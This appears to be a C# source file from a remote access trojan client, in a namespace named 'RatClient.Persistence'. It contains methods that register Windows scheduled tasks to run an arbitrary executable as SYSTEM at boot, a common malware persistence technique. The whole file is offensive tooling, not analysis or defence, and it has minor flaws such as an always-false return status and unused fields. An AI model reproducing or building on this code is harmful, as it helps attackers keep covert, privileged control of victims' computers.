using System;
using System.Collections.Generic;
using Microsoft.Win32.TaskScheduler;

namespace RatClient.Persistence
{
    class TaskTools
    {
        private static readonly Dictionary<string, BootTrigger> trrigers = new Dictionary<string, BootTrigger>
        {
            { "atboot", new BootTrigger { Delay = TimeSpan.Zero }}
        };

        private static readonly Dictionary<string, TaskLogonType> CCCC = new Dictionary<string, TaskLogonType>
        {
            { "SYSTEM", TaskLogonType.ServiceAccount },
            { Environment.UserName, TaskLogonType.InteractiveToken }
        };


        public static bool CreatShedualdTask(string path, string argument, string name, 
            string user=null, string trigger = null, string description = null) 
        {
            user = user ?? "SYSTEM";
            bool status = false;
            using (TaskService ts = new TaskService())
            {
                if (ts.GetTask(name) != null)
                {
                    return true;
                }
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = description != null ? description : "Running " + name;
                td.Actions.Add(new ExecAction(path, argument, null));
                td.Principal.UserId = user;
               
                ts.RootFolder.RegisterTaskDefinition(name, td);
            }
            return status;
        }


        public void CreateNewTask(string path, string argument, string name)
        {
            using (TaskService ts = new TaskService())
            {
                if (ts.GetTask(name) != null)
                {
                    return;
                }

                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "Running " + name;

                // Create a new task action
                td.Actions.Add(new ExecAction(path, argument, null));

                // Set the user and logon type
                td.Principal.UserId = "SYSTEM";
                td.Principal.LogonType = TaskLogonType.ServiceAccount;

                // Create a new trigger for the task at startup
                td.Triggers.Add(new BootTrigger { Delay = TimeSpan.Zero });

                // Register the task
                ts.RootFolder.RegisterTaskDefinition(name, td);

                // Restart the Task Scheduler service
               
            }
        }
    }
}
